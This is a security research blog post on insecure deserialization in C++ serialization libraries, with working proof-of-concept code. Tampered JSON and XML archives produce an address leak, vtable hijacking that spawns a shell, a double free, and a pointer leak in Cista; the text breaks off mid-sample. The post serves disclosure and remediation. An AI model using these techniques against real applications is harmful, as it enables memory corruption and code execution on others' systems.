---
title: "Sharing is Caring: Insecure Deserialization of Shared References in C++"
excerpt: Exploring a hidden attack surface in serialization libraries. "Let's serialize pointers and complex structures! What could possibly go wrong?"
tags:
  - cve
  - pwn
  - research
  - cpp
  - infosec
  - writeup
  - types
keywords: [insecure deserialization, deserialization attack, cve, confusion attack, type confusion]
thumbnail_src: assets/deserialization_meme_69.png
thumbnail_banner: false
tocOptions:
  tags: [h2, h3, h4]
related:
  tags: [infosec]
  posts: [/advisory/cpp-deserialization,arbitrary-code-execution-for-breakfast, gdb-cheatsheet]
preamble: |
  > *There where it is we do not need the wall:*  
  > *He is all pine and I am apple orchard.*  
  > *My apple trees will never get across*  
  > *And eat the cones under his pines, I tell him.*  
  > *He only says, ‘Good fences make good neighbors.’*  
  > 
  > — Extract from *Mending Wall* by Robert Frost
---

Deserialization attacks have grown in popularity over the past decade, with major flaws hitting [tech giants](https://thehackernews.com/2025/07/hackers-exploit-sharepoint-zero-day.html) and [modern frameworks](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)— even in 2025.

Late July, a question came to mind: "What if we took insecure deserialization and brought it to C++?" I’ve had fond memories using deserialization attacks to pop shells in CTFs, courses, and engagements, plus I enjoy tinkering with C++, so I decided to spend some personal time investigating this topic. Exploring this simple question resulted in a few late nights and an interesting— to my knowledge, novel— subclass of bugs.

This post presents my latest research, in which we’ll explore proof-of-concepts, do a bit of root cause analysis, and touch on Rust. I've also shared an [advisory][advisory] for those looking to remediate.

[advisory]: /advisories/cpp-deserialization/

{% image "assets/deserialization_party.jpg", "jw-60", "" %}

(I would not call myself a pwn expert, so any corrections, suggestions, or insights are more than welcome.)

## tl;dr

- **What**: Deserialization bugs were discovered across five C++ serialization libraries, potentially impacting downstream libraries and applications used across finance, science, IoT, and robotics.
- **How**: These libraries feature serialization of shared pointers/references— objects can reference other objects within an archive. Due to insufficient runtime type checking, an attacker could force objects of different types to share the same memory, opening the door to type confusion and memory corruption primitives.
- **Impact**: Information disclosure, control flow hijacking, heap corruption; all potentially leading to arbitrary code execution.
- **Who is impacted?** Conditions apply. For a detailed guide, you may wish to skip to the [advisory][advisory].
- **A hidden subclass of bugs?** These aren’t your run-of-the-mill deserialization bugs common in .NET, PHP, or Java. Here, we have little control over the type deserialized and have no means to automatically execute code. The attack path is very different, and more akin to binary exploitation.

## Insecure Deserialization Redux

When discussing insecure deserialization attacks, we typically think of a number of things: dynamic reflection, gadgets, POP chains, sweet sweet RCE.

But C++ only offers static reflection, and there is no automatic execution of untrusted data. Popular deserialization attacks won’t cut it; we need to rethink our approach in the context of a statically-typed, low-level language. What is a mechanism to exploit? What are our primitives? Can we still get that scrumptious RCE?

In the world of binary exploitation, primitives and gadgets exist in a low-level form. Instead of file read or file write, we think in terms of memory read and memory write. Instead of class or method-level gadgets, we have assembly-level gadgets.

As with other languages, we start by assuming the serialized payload is attacker-controllable. From here, the deserialization API is an attack surface.^[Interestingly, some researchers take the opposite approach by considering the *serialization* API an attack surface. Here, a successful attack scenario usually involves rare preconditions of uninitialised data or type narrowing/widening issues which I guess would assume the developer doesn't read documentation, doesn’t properly test their code, or is actively sabotaging their software. It means an attacker needs to control the data prior to serialization. These are still scored as critical issues, to the chagrin of library authors. Examples are CVE-2020-11104, CVE-2020-11105 (Cereal), [CVE-2024-35326](https://github.com/yaml/libyaml/issues/302) (libyaml) (rejected).] Our attention then turns to finding the functions and conditions necessary for exploitation.

## Sharing is Caring

While noodling around, I realized a few libraries have an interesting feature: **serialization of references**. The concept is also described as “object identity preservation”, “object tracking”, “pointer serialization”, or “reference sharing”.

To understand this feature, let’s consider the following example:

```cpp
Address* address = new Address("42 Windbag Street");
Person a = Person("Alice", address);
Person b = Person("Bob", address);
```

Alice and Bob share an address. What would serialization look like?

Serialization libraries tend to take one of two approaches. Either duplicate the data and serialize `address` **twice**; or preserve the structure and serialize `address` **once**. Both implementations have their tradeoffs, but it is the latter we are concerned with.

To preserve structure, it becomes necessary to have some **referencing mechanism** in the archive format. Let’s slightly modify the example:
{% image "assets/deserialization_diagram_example_serialization.png", "jw-100", "" %}

On the left, we have a simple graph represented in code and memory. On the right, we have its serialization in a dumbed down JSON format. Each node’s *data* is serialized once. Note that while `C` appears to be serialized twice, the second instance is merely a reference to the first. In this contrived serialization format, we use the `id` field to denote an object's identity.

What does *deserialization* look like? On the first encounter of an ID, the contents are deserialized and the ID is associated with the object. On subsequent encounters, the previous object is reused.

Given this example, the hacker in you may wonder:

- What if `id` is negative or too large?
- What if the JSON parser is buggy?
- What if we deserialize a cyclical graph?
- **What if a pointer/reference refers to an object with a completely different type?** (i.e. We change the scenario to serialize the code serializes other types and not just the `Node` type.)
- **What if the referencing mechanism could be applied to non-referencing types?**

All of these are potential attack vectors on the deserialization API. Some may lead to ~~boring~~ classic out-of-bound reads. Some may lead to DoS. In this post, we'll concern ourselves only with the last few questions, which put simply is this: can we abuse the referencing mechanism?

## Understanding Our Targets

I deliberately chose libraries which support serialization of references. This automatically eliminates popular language-agnostic libraries (e.g. Protobufs, Msgpack) from our scope as they don't support the feature.

Once we’ve culled the masses, we're left with libraries such as Boost Serialization, Cereal, Bitsery, and HPX. These libraries support the serialization of deep, complex structures with use cases spanning cross-process communication (IPC/RPC), finance, IoT, robotics, and science.

- **Boost Serialization**. Boost is a popular C++ library which extends the standard library with various classes and features. Boost *Serialization*, born in 2003, is only one module among a plethora of modules and supports features including versioning, multiple archive formats (binary, text, XML), and serialization support for numerous standard types.
- **Cereal** is a slightly modern rehash of Boost Serialization, catering to C++11 features and modern formats such as JSON.
- **HPX** is an implementation of the C++ standard template library (STL) designed for high-performance computing (HPC). HPX contains a serialization module meant for message passing across a distributed system. It’s also based on Boost Serialization, but drops support for text-based formats in favor of the speedier binary formats. It also drops support for raw pointers.
- **Bitsery** is a serialization library which uses a custom binary format. It has a unique approach to serializing pointers, emphasising ownership.
- **Cista** is a serialization library featuring zero-copy deserialization and uses a binary serialization format. The concept of zero-copy deserialization is an important differentiator, affecting not only the API usage but also the attack surface and potential vulnerability impact. More on this later.
- **rkyv** is a Rust library supporting zero-copy deserialization, similar to Cista. More on this later.

{% image "assets/deserialization_diagram_libraries.png", "jw-100", "" %}

<sup>A non-exhaustive mindmap of our target libraries and how they fit within the ecosystem. We are primarily interested in libraries which support pointer serialization.</sup>
{.caption}

It's worth noting that the attack approach is unlike well-known attacks on `BinaryFormatter`, `java.io.Serializable`, and PHP native serialization. We do not aim to deserialize arbitrary classes with code execution capabilities. That would be a miracle in a statically-typed language which compiles to native machine code. Rather, we strive to be agents of chaos by conflating pointers and data: Confusion Attacks.

## Insecure Deserialization Meets C++ Meets Confusion Attacks

{% image "assets/deserialization_meme_69.png", "jw-80", "" %}

Broadly speaking, a confusion attack exploits some (hidden) ambiguity in a system. Weird things can happen when two or more components disagree on the semantics of a property, variable, or memory region. Weird things which can make your computer explode— or more realistically, allow some remote hackerman into your system.

Taking inspiration from [Orange Tsai’s sharing on confusion attacks in 2024](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/), I’ll present a few different avenues for deserialization/confusion attacks along with potential attack primitives. Unlike Orange, however, I won’t be presenting any new strains of confusion attacks, and I certainly won’t be replicating his prowess or scale.

We'll cover the following today:

1. **Type Confusion**: Exploits the ambiguity in the structure and semantics of memory, ultimately, confusing pointers and data. What if pointers were treated as data? What if apples were pine cones?
2. **Ownership Confusion**: Exploits the ambiguity of pointer ownership. What if we violate ownership and lifetime assumptions?

### 1. Type Confusion

Type Confusion is realized when memory is interpreted differently by two or more types.

Here’s a simple example. By confusing a string and an integer, it is possible to create ambiguity in the first 8 bytes.

{% image "assets/deserialization_diagram_type_confusion.png", "jw-60 alpha-imgv", "" %}

<sup>In C++, an `std::string` is a dynamically-sized character array, which is achieved by storing a pointer to heap-allocated memory.</sup>
{.caption}

At a very low level, such vulnerabilities boil down to confusion between pointers and data. If pointers are treated as data, there is the potential for address leakage (information disclosure). More severely, if attacker-controlled data are treated as pointers, it could lead to memory read/write and control flow hijacking primitives.

This attack is not new. Type Confusion flaws are common in browser and mobile exploitation, and have been repeatedly discovered in major players such as the [V8](https://nvd.nist.gov/vuln/search#/nvd/home?keyword=type%20confusion&cpeFilterMode=cpe&cpeName=cpe:2.3:a:google:chrome:10.*:*:*:*:*:*:*:*&resultType=records) JavaScript engine.

Depending on the types confused, we can achieve a variety of primitives and impact. Let’s explore the potential primitives found by confusing common C++ types and structures!

#### 1.1. Address Leak

Address leaks are targeted memory reads useful for bypassing protections such as ASLR and PIE. They provide a starting point to exploit an application.

Conditions:
1. Deserialize a type `A` which contains a pointer member `ptr`. Examples are `std::string`, `std::vector`, or any polymorphic class— structures which contain a pointer of some sort.
2. In the same archive, deserialize a type `B` such that the pointer member `ptr` is interpreted as a value.
3. The deserialized object of type `B` is outputted and observable by the attacker (e.g. network request, `std::cout`, rendered on UI).

{% image "assets/deserialization_diagram_address_leak_primitive.png", "jw-60 alpha-imgv", "" %}

The above diagram demonstrates an address leak by confusing an `std::string` with a `uint64_t` (64-bit unsigned integer). When the `B` object is printed, `buffer` is interpreted as an integer instead of a pointer! If the string is stored as a stack/global variable, a stack/binary address can be leaked with short-string optimization (SSO). Otherwise, a heap address can be leaked.

{% alert "fact" %}
This also works if the `ptr` in `A` is an `n`th-degree pointer and the corresponding type in `B` is an `i`th degree pointer, where `i` is any number between `0` to `n-1`.

For example, suppose `A` is a polymorphic type, which contains a 2nd-degree pointer aka the vpointer (a pointer to pointer to functions). We can get an address leak by type-confusing `A` with a `uint64_t` (0th-degree pointer) or a `uint64_t*` (1st-degree pointer). In the latter case, a dereference is needed for the pointer to be treated as a value.

This is demonstrated in the [breakfast CTF challenge](/posts/arbitrary-code-execution-for-breakfast/), where we confuse a polymorphic object with an `std::string`, allowing us to leak a VTable entry.
{% endalert %}

{% details "Concrete Example 🔥: Address Leak" %}
Here’s a simple example where we abuse type confusion for an address leak in Cereal.

```cpp {data-label=addr_leak.cpp}
#include <cereal/archives/json.hpp> // Include the archive format used.
#include <cereal/types/memory.hpp> // Cereal defines methods for common std structures.
#include <cereal/types/string.hpp>
#include <fstream>
#include <iostream>
#include <memory>
#include <string>

// Define two types which differ in their second member (std::string vs uint64_t).
struct A {
    std::string fruit;
    std::string sdata;

    // Define a generic `serialize` method which takes in an archive of any
    // format (JSON, binary, etc.). Quite conveniently, the user only needs to
    // write *one function* to define both serialization and deserialization!
    template <class Archive>
    void serialize(Archive& ar) {
        // Cereal uses name-value pairs to determine JSON keys. By default, this
        // is value0, value1, and so on; but we use CEREAL_NVP to say: "I want
        // the name to be the variable identifier instead of valueX".
        ar(CEREAL_NVP(fruit), CEREAL_NVP(sdata));
    }
};

struct B {
    std::string fruit;
    uint64_t idata;

    template <class Archive>
    void serialize(Archive& ar) {
        ar(CEREAL_NVP(fruit), CEREAL_NVP(idata));
    }
};

int main(int argc, char**) {
    if (argc == 1) {
        // Serialize and output JSON to a file.
        std::ofstream os("data.json");
        cereal::JSONOutputArchive archive(os);

        std::shared_ptr<A> a = std::make_shared<A>(A{"Apple", "foo"});
        std::shared_ptr<A> a2 = a;
        std::shared_ptr<B> b = std::make_shared<B>(B{"Banana", 0x42});
        archive(CEREAL_NVP(a), CEREAL_NVP(a2), CEREAL_NVP(b));
    }

    {
        // Read and deserialize.
        std::ifstream is("data.json");
        cereal::JSONInputArchive archive(is);

        std::shared_ptr<A> a;
        std::shared_ptr<A> a2;
        std::shared_ptr<B> b;
        archive(CEREAL_NVP(a), CEREAL_NVP(a2), CEREAL_NVP(b));

        std::cout << std::hex;
        std::cout << "a: " << a->fruit << " " << a->sdata << std::endl;
        std::cout << "a2: " << a2->fruit << " " << a2->sdata << std::endl;
        std::cout << "b: " << b->fruit << " " << b->idata << std::endl;
    }
}
```

Running the program normally, we get the following output and serialized JSON:
```sh {.command-line data-prompt=$ data-output=3-10}
g++ -I cereal-1.3.2/include addr_leak.cpp -o addr_leak
./addr_leak 
a: Apple foo
a2: Apple foo
b: Banana 0x42
```

```json {data-label="data.json (original)"}
{
    "a": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "fruit": "Apple",
                "sdata": "foo"
            }
        }
    },
    "a2": {
        "ptr_wrapper": {
            "id": 1
        }
    },
    "b": {
        "ptr_wrapper": {
            "id": 2147483650,
            "data": {
                "fruit": "Banana",
                "idata": 66
            }
        }
    }
}
```

The format is fairly straightforward. The values of `a`, `a2`, and `b` correspond to their respective objects. `ptr_wrapper` is a wrapper for shared pointers. Cereal implements object tracking with the `id` field. When a shared pointer is first encountered, Cereal sets the `id` to an incrementing counter plus the {% abbr "MSB", "most significant bit" %} 2<sup>31</sup> (or `1 << 31`, 2147483648). Otherwise, when the pointer is reused, the `id` is set directly without the extra bit flag. In the JSON above, we can see how `a2` refers to `a` with `id = 1` and how `b` is its lonely self with `id = 2`. Finally, `data` holds the contents of the underlying object. Simple, right?

Now, suppose an attacker uses a modified JSON archive by adjusting the `id` field of `b`.

```json {data-label="data.json (modified)" data-diff}
{
    "a": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "fruit": "Apple",
                "sdata": "foo"
            }
        }
    },
    "a2": {
        "ptr_wrapper": {
            "id": 1
        }
    },
    "b": {
        "ptr_wrapper": {
// +++++
            "id": 1
// -----
            "id": 2147483650,
            "data": {
                "fruit": "Banana",
                "idata": 66
            }
// =====
        }
    }
}
```

After deserializing, the output is:

```sh
a: Apple foo
a2: Apple foo
b: Apple @@0x55c65a115c70@@
```

Woah! Big number! We observe `b->fruit` prints `Apple`, but `b->idata` prints a heap address! What happened?

Upon deserialization, `a` and `b` share the same memory address. This leads to confusion in the case of the `sdata`/`idata` member. When printing `sdata`, the memory is treated as a string. But when printing `idata`, the memory is treated as an integer. This "treatment" is bound at compile time due to static typing. Since the first member of an `std::string` happens to be the string buffer, we get an address leak.

{% image "assets/deserialization_diagram_address_leak_example.png", "jw-60 alpha-imgv", "" %}

{% enddetails %}

#### 1.2. Arbitrary Memory Read

Conditions:
1. Deserialize a type `A` equivalent to a `uint64_t[2]`.
2. In the same archive, deserialize a type `B` equivalent to an `std::string` (or other buffer-like structure) such that it shares memory with the first object.
3. The deserialized object of type `B` is outputted and observable by the attacker.

{% image "assets/deserialization_diagram_arbitrary_memory_read_primitive.png", "jw-60 alpha-imgv", "" %}

Under this scenario, it is possible to read arbitrary memory by controlling the first two members of type `A`, which correspond to the string buffer and size in type `B`. Controlling the third member may be important if the string is later modified (because then capacity is checked for possible resizing).

The diagram and conditions are portrayed with gcc/x64 in mind.

#### 1.3. VTable Hijacking (Control Flow Hijacking)

Conditions:
1. Deserialize a type `A` equivalent to a `uint64_t`.
2. In the same archive, deserialize a polymorphic (virtual) class `B` such that it shares memory with the first object.
3. The deserialized object of type `B` has a virtual function which is called.

{% image "assets/deserialization_diagram_vtable_hijacking_primitive.png", "jw-60 alpha-imgv", "" %}

Under this scenario, it is possible to hijack control flow by controlling a v-pointer. When the virtual function is triggered, a double dereference is performed on the v-pointer to obtain a function address, which is then called.


{% details "What is a vtable?" %}

To first understand VTable hijacking, we need to understand virtual classes, which is a feature of C++. I won't explain polymorphism and virtual classes in detail, but here's a refresher on the low-level implementation:

- Each virtual class has **one** corresponding virtual table (vtable).
- The vtable stores an **array of virtual functions**.
- Each **object** of a virtual class **holds a virtual pointer** (vpointer) which points to the vtable they are instantiated with. The vpointer precedes other members.

{% image "assets/deserialization_vtable.png", "alpha-img", "" %}

<sup>Example of two objects of a base class `B` and a derived class `C`. Credit: [Pablo Arias][vtable-pablo]</sup>
{.caption}

When a virtual function is called, dynamic dispatch is carried out by looking up the vtable then jumping to a function at a hard-coded offset. In assembly, this could be seen as a double dereference.

```asm
; precondition: rax contains the address of the object
mov    rdx,QWORD PTR [rax] ; first dereference (get vtable from vpointer)
mov    rdx,QWORD PTR [rdx] ; second dereference (get function inside vtable)
call   rdx                 ; call the function
```

That's... pretty much it. For further reading, check out: [StackOverflow](https://stackoverflow.com/a/99341/10239789) and [Understanding Virtual Tables in C++ by Pablo Arias][vtable-pablo].

[vtable-pablo]: https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/

So how do we exploit this? There are two common ways:

- "Fake" the vpointer. If we can control the vpointer, we can direct it to an arbitrary vtable (one that we potentially control).
- Overwrite a vtable entry. This requires some sort of arbitrary write primitive.

On the next virtual function call, our fake entry will be triggered which would allow us to call functions and gadgets for total carnage!

{% enddetails %}

{% details "Concrete Example 🔥: VTable Hijacking" %}

Similar to the Address Leak example, we'll start with some Cereal code:

```cpp {data-label=vtable_hijacking.cpp}
#include <cereal/archives/json.hpp>
#include <cereal/types/memory.hpp>
#include <fstream>
#include <iostream>
#include <memory>

struct A {
    uint64_t x; // Note: x is now an integer instead of a string.

    template <class Archive>
    void serialize(Archive& ar) {
        ar(CEREAL_NVP(x));
    }
};

struct B {
    // B is a virtual class with a hidden member:
    // void** vptr;

    virtual void foo() { std::cout << "B::foo()" << std::endl; }

    template <class Archive>
    void serialize(Archive& ar) {}
};

// Target Function: We want to direct control flow to this function.
void pwned() {
    std::cout << "pwned!" << std::endl;
    system("/bin/sh");
}
// Target VTable: We want to direct the vpointer to point to this address.
void* table[] = {(void*)pwned};

int main(int argc, char**) {
    if (argc == 1) {
        std::ofstream os("data.json");
        cereal::JSONOutputArchive archive(os);

        std::shared_ptr<A> a = std::make_shared<A>(A{42});
        std::shared_ptr<B> b = std::make_shared<B>();
        archive(a, b);
    }

    // Simulate an address leak.
    std::cout << "table: " << (&table) << " " << (uint64_t)(&table) << "\n";
    std::cin.ignore(); // Pause for manual editing of JSON.

    {
        std::ifstream is("data.json");
        cereal::JSONInputArchive archive(is);

        std::shared_ptr<A> a;
        std::shared_ptr<B> b;
        archive(a, b);

        std::cout << "a: " << a << " " << a->x << std::endl;
        std::cout << "b: " << b << " ";
        b->foo(); // Virtual function call!
    }
}
```

Let's run this cleanly once to see what the archive and output look like.

```json {data-label="data.json (original)"}
{
    "value0": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "x": 42
            }
        }
    },
    "value1": {
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
            "id": 2147483650,
            "data": {}
        }
    }
}
```

```sh {.command-line data-prompt=$ data-output=3-10}
g++ -I cereal-1.3.2/include vtable_hijacking.cpp -o vtable_hijacking
./vtable_hijacking
table: 0x55565d02d010 93829416013840

a: 0x55567308bc20 42
b: 0x55567308b9f0 B::foo()
```

Now let's run this again but hijack control flow using type confusion!

```json {data-label="data.json (modified)" data-diff}
{
    "value0": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                // Paste leaked target address here before continuing.
                // (See output in next code block.)
                "x": 94806061596688
            }
        }
    },
    "value1": {
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
// +++++
            "id": 1 // Refer to first object.
// -----
            "id": 2147483650,
            "data": {}
// =====
        }
    }
}
```

Output:
```sh {.command-line data-prompt=$ data-output=2-6,8}
./vtable_hijacking
table: 0x5639c19fc010 94806061596688
(copy address into data.json)

a: 0x5639cba38170 94806061596688
b: 0x5639cba38170 pwned!
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

We successfully redirected control flow to the `pwned` function!

{% image "assets/deserialization_meme_very_nice.png", "", "" %}

The code is slightly contrived in that we hard-coded a shell function, fake vtable, and address leak. But these can all be accomplished through other means.

{% enddetails %}

#### 1.4. Arbitrary Code Execution (ACE)

We can use the above three primitives to achieve code execution! Here's the rundown:

1. Leak a binary/stack/heap address to bypass PIE/ASLR. This provides a foundation for further exploits. Now we can query nearby addresses to gain more information. (Primitive 1.1)
2. Leak a libc address, libstdc++ address, and possibly other details. A libc address helps us locate gadgets. (Primitive 1.2)
3. Craft a "fake vtable" containing a sneaky little gadget chain.
4. Confuse the vpointer to hijack control flow. When a virtual function is called, our gadget chain is triggered. (Primitive 1.3)

A detailed example and walkthrough is provided in my earlier post [“Sharing is Caring: Arbitrary Code Execution for Breakfast”](/posts/arbitrary-code-execution-for-breakfast/), where I shared a CTF challenge with the goal of obtaining RCE on a simple program written with Cereal.

For context, here is the vulnerable code; try to figure out how to obtain the primitives :).

```cpp
struct Congee
{
    uint64_t ingredients[8];
};

struct Toast
{
    uint64_t spread;
    virtual void eat() { /* ... */ }
};

struct Fruit
{
    std::string name;
};

// ...

// Read untrusted input.
std::string input;
std::getline(std::cin, input);

std::stringstream ss(input);
cereal::JSONInputArchive archive(ss);

std::shared_ptr<Congee> c;
std::shared_ptr<Toast> t;
std::shared_ptr<Fruit> f;
// Deserialization happens here!
archive(c, t, f);
// Show the deserialized values...
std::cout << "c: " << *c << std::endl;
std::cout << "t: " << *t << std::endl;
std::cout << "f: " << *f << std::endl;
t->eat(); // Call a sneaky little function.
```

### 2. Ownership Confusion Leading to Heap Corruption in Boost Serialization

Ownership Confusion is realized when an ownership model is violated at runtime.^[One can argue this is a gimmick for heap corruption, but there is a subtle difference. :P I use "ownership confusion" because I think "heap corruption" describes the situation inaccurately. Let me reword that: heap corruption *is the impact* (or perhaps more accurately, an *intermediate primitive*?), but the *attack itself* targets memory/lifetime assumptions and doesn't *directly* target the heap. Ultimately, this is a confusion attack on lifetime semantics.] For instance, pointers with a unique ownership model are instead shared, which may lead to heap corruption vulnerabilities such as double-free or use-after-free (UAF). These open the door to further exploitation, potentially leading to {% abbr "ACE", "Arbitrary Code Execution" %}.

{% image "assets/deserialization_diagram_ownership_confusion.png", "jw-60 alpha-imgv", "" %}

Conditions:
1. Deserialize multiple objects of type `unique_ptr<A>` (or of similar semantics), internally pointing to the same memory.

{% image "assets/deserialization_diagram_double_free_primitive.png", "jw-80 alpha-imgv", "" %}

Normally, only one unique pointer should own a resource. (The resource's owner is *unique*.) But when multiple unique pointers hold the same object, that object will be freed multiple times! One scenario where this could be more easily exploited is with a container of unique pointers such as `vector<unique_ptr<T>>`.

```cpp
{
    std::vector<std::unique_ptr<T>> v;
    v.push_back(std::make_unique(...));
    v.push_back(std::make_unique(...));
} // Destructor called, all pointers are freed.
```

Alternatively, it is also possible to achieve a use-after-free (UAF) primitive if a second object remains active after the first one is deleted.

The root cause is that Boost Serialization allows the `object_id` property for pretty much *anything*, but it's especially dangerous when pointers are mixed in. This means objects can have *shared ownership* properties simply by sharing the same `object_id`, even if the expected types do **not** have such properties. But the headaches don't end there. Boost Serialization also supports raw pointers which are nefarious for their ambiguous lifetime semantics.

{% details "Concrete Example 🔥: Double Free" %}

This time, instead of serializing `shared_ptr`, we'll be serializing its cousin the `unique_ptr`.

```cpp {data-label=double_free.cpp}
#include <boost/archive/xml_oarchive.hpp>
#include <boost/archive/xml_iarchive.hpp>
#include <boost/serialization/serialization.hpp>
#include <boost/serialization/unique_ptr.hpp>
#include <iostream>
#include <fstream>
#include <memory>

struct A {
    uint64_t data;

    template <class Archive>
    void serialize(Archive &ar, unsigned) { ar & BOOST_SERIALIZATION_NVP(data); }
};


int main(int argc, char**) {
    if (argc == 1) {
        std::ofstream ofs("data.xml");
        boost::archive::xml_oarchive oa(ofs);

        std::unique_ptr<A> x = std::make_unique<A>(A{42}), y = std::make_unique<A>(A{43});
        oa << BOOST_SERIALIZATION_NVP(x);
        oa << BOOST_SERIALIZATION_NVP(y);
    }

    {
        std::ifstream ifs("data.xml");
        boost::archive::xml_iarchive ia(ifs);

        std::unique_ptr<A> x, y;
        ia >> BOOST_SERIALIZATION_NVP(x);
        ia >> BOOST_SERIALIZATION_NVP(y);

        std::cout << "x: " << x.get() << " " << x->data << std::endl;
        std::cout << "y: " << y.get() << " " << y->data << std::endl;
    }
}
```

Running produces the following output and XML archive:

```sh {.command-line data-prompt=$ data-output=3-10}
g++ double_free.cpp -lboost_serialization -o double_free
./double_free 
x: 0x5627d925d3f0 42
y: 0x5627d925db50 43
```

```xml {data-label="data.xml (original)"}
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<!DOCTYPE boost_serialization>
<boost_serialization signature="serialization::archive" version="19">
<x class_id="0" tracking_level="0" version="0">
    <tx class_id="1" tracking_level="1" version="0" object_id="_0">
        <data>42</data>
    </tx>
</x>
<y>
    <tx class_id_reference="1" object_id="_1">
        <data>43</data>
    </tx>
</y>
</boost_serialization>
```

But what if we modify the archive so that the second object refers to the first?

```xml {data-label="data.xml (modified)" data-diff}
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<!DOCTYPE boost_serialization>
<boost_serialization signature="serialization::archive" version="19">
<x class_id="0" tracking_level="0" version="0">
    <tx class_id="1" tracking_level="1" version="0" object_id="_0">
        <data>42</data>
    </tx>
</x>
<y>
<!-- +++++ -->
    <tx class_id_reference="1" object_id="_0">
-----
    <tx class_id_reference="1" object_id="_1">
        <data>43</data>
    </tx>
<!-- ===== -->
</y>
</boost_serialization>
```

Boom!

```sh {.command-line data-prompt=$ data-output=2-10}
./double_free a
x: 0x55efc234c240 42
y: 0x55efc234c240 42
free(): double free detected in tcache 2
Aborted
```

In this case, the double free was caught by protections available in recent libc versions. But it's not game over yet! It is possible to bypass these protections, say if we have more control over the number and order of deserializations (e.g. `std::vector<std::unique_ptr<T>>`). I’ll leave this as an exercise for the reader.

{% enddetails %}


### 3. Type Confusion Leading to Address Leak in Cista (Zero-Copy Deserialization)

Among the five affected libraries, Cista is unique for featuring **zero-copy deserialization**. Instead of parsing and unpacking bytes, the library performs a type cast on the allocated memory and voilà, the data can be used directly. This enables faster deserialization while sacrificing payload size and requiring custom types.

Cista supports two different archive formats: `cista::offset` and `cista::raw`. Both are binary formats and serialize to the same output, but their difference lies in whether *pointer resolution is deferred*. `cista::offset` defers pointer resolution. Every time data is accessed, an extra addition is needed to calculate the pointer. `cista::raw` does **not** defer calculation, with the benefit of faster runtime access down the line.

The `cista::raw` implementation is vulnerable to potential address leakage when deserializing untrusted input. This happens for types such as `cista::raw::ptr` (weak non-owning reference), `cista::raw::string`, and `cista::raw::vector` which internally contain an offset to their boxed data and upon deserialization will **update the buffer with resolved pointers**.

{% image "assets/deserialization_diagram_cista.png", "jw-100 alpha-imgv", "" %}

This is a security issue! By mixing pointers and data without clear boundaries, applications may inadvertently treat pointers as data, which may lead to information disclosure such as an address leak. This is type confusion, not in the traditional sense, but in the sense that pointers and data are mixed, and Cista can't tell one from the other.

Conditions for an address leak in Cista:

- Code deserializes an offset-based type under the `cista::raw` namespace. This includes `ptr` (weak non-owning reference), `string`, `vector`, and other container types.
- The deserialized data is observable by the attacker.

This may leak a heap/stack address which could be used to bypass ASLR.

{% details "Concrete Example 🔥: Address Leak in Cista", "open" %}
Here's a quick example. Suppose we're serializing a `cista::raw::ptr`.

```cpp
struct Number {
    uint64_t x;
};

struct A {
    cista::indexed<Number> a; // `indexed` is needed so that other members can reference it.
    cista::raw::ptr<Number> pa;
};

// ...

std::vector<unsigned char> buf;
{
    A data;
    data.a.x = 42;
    data.pa = &data.a; // weak (non-owning) reference
    // serialize
    buf = cista::serialize(data);
}

// deserialize
auto deserialized = cista::deserialize<A, cista::mode::DEEP_CHECK>(buf);
// use
std::cout << "a: " << deserialized->a.x << std::endl;
std::cout << "pa: " << deserialized->pa->x << std::endl;
```

The serialized output is 16 bytes. The first 8 bytes stores 42 in little endian. The last 8 bytes stores an offset (`-8`) to the first 8 bytes, in two's complement. This is Cista's referencing mechanism.

```cpp
//  Number = 42
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // a
//  offset = 0xffff'ffff'ffff'fff8 = -8 
0xf8,0xff,0xff,0xff,0xff,0xff,0xff,0xff, // pa
```

Once we deserialize this buffer, `cista::raw` will **replace the offset with a memory address**. If the internal buffer address was at `0x555590abcde0`, we would see the following replacement:

```cpp
// Before Deserialization
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0xf8,0xff,0xff,0xff,0xff,0xff,0xff,0xff, // offset = -8
// After Deserialization
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // @0x555590abcde0
@@0xe0,0xcd,0xab,0x90,0x55,0x55,0x00,0x00@@, // @0x555590abcde8; replaced with pointer to `a` (the 8 bytes above)
```

When trying to read the data at `pa`, Cista will dereference the pointer `0x555590abcde0` to get the number 42.

---

Now, suppose we set the offset to `0` instead of `-8`. What happens?

```cpp
// Before Deserialization
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // a
@@0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00@@, // pa, offset = 0
// After Deserialization
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // a
@@0xe8@@,0xcd,0xab,0x90,0x55,0x55,0x00,0x00, // pa, replaced with pointer to ITSELF
```

Upon deserialization, the last 8 bytes would be replaced with *the address of the same 8 bytes* (a pointer to *itself*!). User code wouldn't know any difference and `deserialized->pa->x` would contain an address.

When trying to read the data at `pa`, Cista will dereference the pointer **`0x555590abcde8`** and get the number 93825987759592. The data is the pointer!

{% enddetails %}

{% details "Full Sample Code" %}

```cpp {data-label=cista_addr_leak.cpp}
// g++ main.cpp -g && ./a.out
#include <iostream>
#include <iomanip>
#include <string>
#include <sstream>
#include "cista.h"

namespace data = cista::raw;

struct Number {
    uint64_t x;
};

struct A {
    cista::indexed<Number> a;
    data::ptr<Number> pa;
};

void printBuffer(const std::vector<unsigned char>& buf) {
    for (int i = 0; i < buf.size();) {
        for (int j = 0; j < 16 && i < buf.size(); i++, j++) {
            std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0') << (uint16_t)buf[i] << ((i+1) % 8 ? "," : ", ");
        }
        std::cout << std::endl;
    }
    std::cout << std::dec;
}

int main(int argc, char** argv) {
    std::vector<unsigned char> buf;
    {
        A data;
        data.a.x = 42;
        data.pa = &data.a;

        buf = cista::serialize(data);
        std::cout << "a: " << data.a.x << std::endl;
